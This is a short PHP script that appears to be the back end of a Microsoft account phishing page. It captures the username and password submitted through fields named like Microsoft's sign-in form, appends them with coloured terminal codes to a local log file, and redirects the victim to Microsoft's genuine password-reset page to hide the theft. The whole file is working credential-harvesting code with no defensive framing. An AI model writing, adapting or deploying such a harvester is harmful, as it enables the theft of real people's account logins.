<?php
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

file_put_contents("live_login.log", 
    "{$BRIGHT_YELLOW}Microsoft {$BRIGHT_CYAN}Username: {$BRIGHT_GREEN}" . $_POST['loginfmt'] . 
    " {$BRIGHT_CYAN}Pass: {$BRIGHT_GREEN}" . $_POST['passwd'] . "{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://account.live.com/ResetPassword.aspx');
exit();
?>